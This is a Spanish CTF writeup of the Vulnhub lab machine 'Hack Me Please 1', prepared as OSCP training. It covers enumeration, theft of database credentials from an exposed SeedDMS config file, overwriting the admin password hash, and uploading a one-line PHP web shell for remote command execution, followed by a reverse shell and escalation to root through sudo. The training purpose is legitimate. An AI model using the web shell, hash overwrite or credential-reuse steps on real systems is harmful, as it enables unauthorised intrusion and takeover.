---
title: Hack Me Please 1 Writeup - Vulnhub
date: 2025-03-18
categories: [Writeups, Vulnhub OSCP Prep]
tags: [Linux, Vulnhub, CTF, HackMePlease 1, OSCP Prep]
image:
  path: /assets/img/commons/vulnhub/hack_me_please1/portada.png
---

Anterior [*OSCP Lab 26*](https://lvs3c.github.io/posts/OSCP-Venom1/)

¡Saludos!

**`OSCP Lab 27`**

En este writeup, realizaremos la máquina [**Hack Me Please 1**](https://www.vulnhub.com/entry/hack-me-please-1,731/). 

Se trata de una máquina **Linux** en la cual veremos:
- **Enumeración de servicios**.
- **Fuzzing de archivos y directorios**.
- Encontrar **SeedDMS** mediante lectura de código javascript.
- Acceso a **Mysql** mediante captura de archivo xml, obteniendo datos de acceso al panel de control y de usuario.
- **File Upload** para ejecución de código mediante búqueda en `searchsploit`{: .filepath}.
- **User Pivoting**.
- Y por último, tenemos permisos full sobre el sistema, somos root.

¡Empecemos!

## Reconocimiento activo

---

Necesitamos encontrar la ip correspondiente a la máquina, lo hacemos mediante la herramienta `arp-scan` y posteriormente el comando `ping` para verificar si la máquina objetivo está activa.

```bash
❯ sudo arp-scan -I ens37 --localnet --ignoredups
Interface: ens37, type: EN10MB, MAC: 00:0c:29:ef:5b:48, IPv4: 10.11.12.10
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.11.12.1      00:50:56:c0:00:01       VMware, Inc.
10.11.12.62     00:0c:29:41:8a:78       VMware, Inc.
10.11.12.200    00:50:56:e7:5f:a3       VMware, Inc.

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.481 seconds (103.18 hosts/sec). 3 responded
```

```bash
❯ ping -c 1 10.11.12.62
PING 10.11.12.62 (10.11.12.62) 56(84) bytes of data.
64 bytes from 10.11.12.62: icmp_seq=1 ttl=64 time=0.502 ms

--- 10.11.12.62 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.502/0.502/0.502/0.000 ms
```

## Enumeración

---

Seguidamente, efectuamos una enumeración de las versiones de los servicios asociados y ejecutamos un conjunto de scripts predeterminados de `Nmap` para realizar pruebas complementarias sobre los puertos y servicios identificados.

```bash
❯ sudo nmap -p- -sCV 10.11.12.62 -oN nmap_services
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-20 16:24 -03
Nmap scan report for 10.11.12.62
Host is up (0.00055s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Welcome to the land of pwnland
3306/tcp  open  mysql   MySQL 8.0.25-0ubuntu0.20.04.1
| mysql-info:
|   Protocol: 10
|   Version: 8.0.25-0ubuntu0.20.04.1
|   Thread ID: 45
|   Capabilities flags: 65535
|   Some Capabilities: SupportsLoadDataLocal, FoundRows, Support41Auth, ODBCClient, Speaks41ProtocolOld, SupportsTransactions, IgnoreSpaceBeforeParenthesis, SupportsCompression, InteractiveClient, LongPassword, Speaks41ProtocolNew, IgnoreSigpipes, SwitchToSSLAfterHandshake, LongColumnFlag, DontAllowDatabaseTableColumn, ConnectWithDatabase, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: 3Q\t,\x1CFp-\x16k3\x102\x1A\x1D7)2\x03
|_  Auth Plugin Name: caching_sha2_password
33060/tcp open  mysqlx?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.94SVN%I=7%D=3/20%Time=67DC6B67%P=x86_64-pc-linux-gnu%
SF:r(GenericLines,9,"\x05\0\0\0\x0b\x08\x05\x1a\0");
MAC Address: 00:0C:29:41:8A:78 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 197.90 seconds
```

El informe de `Nmap` nos revela:
- Puerto `80` servidor `Apache httpd 2.4.41`.
- Puerto `3306` servidor `MySQL 8.0.25`.
- Puerto `33060` posible servidor `MySQL`.


### HTTP - 80

Validamos la web.

![web80](/assets/img/commons/vulnhub/hack_me_please1/web80.png){: .center-image }

Lanzamos tanto el script `http-enum` de nmap como `gobuster` para obterner información de archivos o directorios pero no tenemos nada relevante.

Continuamos analizando los javascripts y encontramos un path.

![endpoint](/assets/img/commons/vulnhub/hack_me_please1/endpoint.png){: .center-image }

Ingresando nos lelva a un panel de login.

![login](/assets/img/commons/vulnhub/hack_me_please1/login.png){: .center-image }

Por el momento no tenemos credenciales para ingresar y las default no son válidas.

Lanzamos `gobuster` sobre el directorio raíz `seeddms51x`.

```bash
❯ gobuster dir -u http://10.11.12.62/seeddms51x/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -b 402,403,404
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.11.12.62/seeddms51x/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404,402,403
[+] User Agent:              gobuster/3.6
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://10.11.12.62/seeddms51x/data                 (Status: 301) [Size: 320] [--> http://10.11.12.62/seeddms51x/data/]
http://10.11.12.62/seeddms51x/www                  (Status: 301) [Size: 319] [--> http://10.11.12.62/seeddms51x/www/]
http://10.11.12.62/seeddms51x/conf                 (Status: 301) [Size: 320] [--> http://10.11.12.62/seeddms51x/conf/]
http://10.11.12.62/seeddms51x/pear                 (Status: 301) [Size: 320] [--> http://10.11.12.62/seeddms51x/pear/]
```

Interesante el directorio `conf`{: .filepath}. Volvemos a lanzar gobuster para encontrar archivos dentro.

```bash
❯ gobuster dir -u http://10.11.12.62/seeddms51x/conf/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -b 402,403,404 -x xml
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.11.12.62/seeddms51x/conf/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   402,403,404
[+] User Agent:              gobuster/3.6
[+] Extensions:              xml
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://10.11.12.62/seeddms51x/conf/settings.xml         (Status: 200) [Size: 12377]
```

Analizamos el código del archivo `settings.xml` y obtenemos los datos de acceso al motor sql.

![sqldata](/assets/img/commons/vulnhub/hack_me_please1/sqldata.png){: .center-image }

Dentro de la base, obtenemos tanto información para ingresar al panel de administración como del usuario `saket`.

```bash
❯ mysql -u seeddms --password=seeddms -h 10.11.12.62
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 293
Server version: 8.0.25-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| seeddms            |
| sys                |
+--------------------+
5 rows in set (0,003 sec)

MySQL [seeddms]> select * from users;
+-------------+---------------------+--------------------+-----------------+
| Employee_id | Employee_first_name | Employee_last_name | Employee_passwd |
+-------------+---------------------+--------------------+-----------------+
|           1 | saket               | saurav             | Saket@#$1337    |
+-------------+---------------------+--------------------+-----------------+
1 row in set (0,013 sec)


MySQL [seeddms]> select * from tblUsers;
+----+-------+----------------------------------+---------------+--------------------+----------+-------+---------+------+--------+---------------------+---------------+----------+-------+------------+
| id | login | pwd                              | fullName      | email              | language | theme | comment | role | hidden | pwdExpiration       | loginfailures | disabled | quota | homefolder |
+----+-------+----------------------------------+---------------+--------------------+----------+-------+---------+------+--------+---------------------+---------------+----------+-------+------------+
|  1 | admin | f9ef2c539bad8a6d2f3432b6d49ab51a | Administrator | address@server.com | en_GB    |       |         |    1 |      0 | 2021-07-13 00:12:25 |             0 |        0 |     0 |       NULL |
|  2 | guest | NULL                             | Guest User    | NULL               |          |       |         |    2 |      0 | NULL                |             0 |        0 |     0 |       NULL |
+----+-------+----------------------------------+---------------+--------------------+----------+-------+---------+------+--------+---------------------+---------------+----------+-------+------------+
2 rows in set (0,001 sec)
```

Como no podemos descifrar la password del usuario `admin`, que parece ser MD5, la vamos a cambiar.

```bash
❯ hashid f9ef2c539bad8a6d2f3432b6d49ab51a
Analyzing 'f9ef2c539bad8a6d2f3432b6d49ab51a'
[+] MD2
[+] MD5
[+] MD4
[+] Double MD5
[+] LM
[+] RIPEMD-128
[+] Haval-128
[+] Tiger-128
[+] Skein-256(128)
[+] Skein-512(128)
[+] Lotus Notes/Domino 5
[+] Skype
[+] Snefru-128
[+] NTLM
[+] Domain Cached Credentials
[+] Domain Cached Credentials 2
[+] DNSSEC(NSEC3)
[+] RAdmin v2.x
```

Usamos la contraseña `password`{: .filepath} encriptada en MD5= "5f4dcc3b5aa765d61d8327deb882cf99"

```bash
MySQL [seeddms]> update tblUsers set pwd='5f4dcc3b5aa765d61d8327deb882cf99' where id = '1';
Query OK, 1 row affected (0,004 sec)
Rows matched: 1  Changed: 1  Warnings: 0


MySQL [seeddms]> select * from tblUsers;
+----+-------+----------------------------------+---------------+--------------------+----------+-------+---------+------+--------+---------------------+---------------+----------+-------+------------+
| id | login | pwd                              | fullName      | email              | language | theme | comment | role | hidden | pwdExpiration       | loginfailures | disabled | quota | homefolder |
+----+-------+----------------------------------+---------------+--------------------+----------+-------+---------+------+--------+---------------------+---------------+----------+-------+------------+
|  1 | admin | 5f4dcc3b5aa765d61d8327deb882cf99 | Administrator | address@server.com | en_GB    |       |         |    1 |      0 | 2021-07-13 00:12:25 |             0 |        0 |     0 |       NULL |
|  2 | guest | NULL                             | Guest User    | NULL               |          |       |         |    2 |      0 | NULL                |             0 |        0 |     0 |       NULL |
+----+-------+----------------------------------+---------------+--------------------+----------+-------+---------+------+--------+---------------------+---------------+----------+-------+------------+
2 rows in set (0,001 sec)
```

Ingresamos al panel.

![adminpanel](/assets/img/commons/vulnhub/hack_me_please1/adminpanel.png){: .center-image }

![seeddmsversion](/assets/img/commons/vulnhub/hack_me_please1/seeddmsversion.png){: .center-image }


## Explotación

---

Buscamos por *searchsploit* y encontramos que se puede subir un archivo el cual se almacena en una ruta oculta, teniendo ejecución de código.

![rs1](/assets/img/commons/vulnhub/hack_me_please1/rs1.png){: .center-image }

Subimos nuestro archivo, con el siguiente código.

```bash
❯ cat cmd.php
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: cmd.php
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ GIF8;
   2   │ <?php
   3   │ system($_GET['c']);
   4   │ ?>
───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Buscamos el id necesario para agregar a la url.

![docid](/assets/img/commons/vulnhub/hack_me_please1/docid.png){: .center-image }

Comprobamos y lanzamos la reverse shell.

![rs2](/assets/img/commons/vulnhub/hack_me_please1/rs2.png){: .center-image }
![rs3](/assets/img/commons/vulnhub/hack_me_please1/rs3.png){: .center-image }

```bash
❯ nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.11.12.10] from (UNKNOWN) [10.11.12.62] 56162
bash: cannot set terminal process group (890): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/var/www/html/seeddms51x/data/1048576/4$
```

## User Pivoting

---

Somos `www-data`, pero ya sabemos la contraseña de `saket` obtenida de la base de datos, nos movemos a él.

```bash
www-data@ubuntu:/home$ su - saket
Password:
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

saket@ubuntu:~$
```


## Escalación de privilegios

---

Listamos los permisos del usuario sobre el sistema y tenemos acceso full. 

Somos root.

```bash
saket@ubuntu:~$ sudo -l
[sudo] password for saket:
Matching Defaults entries for saket on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User saket may run the following commands on ubuntu:
    (ALL : ALL) ALL

saket@ubuntu:~$ sudo su
root@ubuntu:/home/saket#
```

Hope it helps!